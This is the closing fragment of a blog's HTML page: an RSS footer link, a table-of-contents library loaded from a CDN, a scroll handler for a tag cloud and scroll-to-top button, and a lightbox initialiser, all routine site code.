  <a href="https://blog.dornea.nu/feed.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
</footer>

  



<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<style>.is-active-link::before { background-color: var(--secondary-color); }</style>




<script type="text/javascript">
var prevScrollpos = window.pageYOffset;
window.onscroll = function() {
  var currentScrollPos = window.pageYOffset;

  
  if (document.getElementById("tag-cloud") !== null) { 
    if (prevScrollpos > currentScrollPos) { 
      document.getElementById("tag-cloud").style.visibility = "visible";
      document.getElementById("tag-cloud").style.opacity = "1";
    } else {
      document.getElementById("tag-cloud").style.visibility = "hidden";
      document.getElementById("tag-cloud").style.opacity = "0";
    }
  }
  

  
  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
      document.getElementById("scroll-to-top").style.display = "inline";
      document.getElementById("scroll-to-top").style.visibility = "visible";
      document.getElementById("scroll-to-top").style.opacity = "1";
  } else {
      document.getElementById("scroll-to-top").style.visibility = "hidden";
      document.getElementById("scroll-to-top").style.opacity = "0";
  }
  
  prevScrollpos = currentScrollPos;
}


function topFunction() {
  document.body.scrollTop = 0; 
  document.documentElement.scrollTop = 0; 
}






if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
  tocbot.init({
    
    tocSelector: '#contents-list',
    
    contentSelector: '.post-content',
    
    headingSelector: 'h1, h2, h3',
  });
}


</script>





<script>
 var glightbox = GLightbox({
     selector: '.glightbox'
 });
</script>

  
</body>
</html>
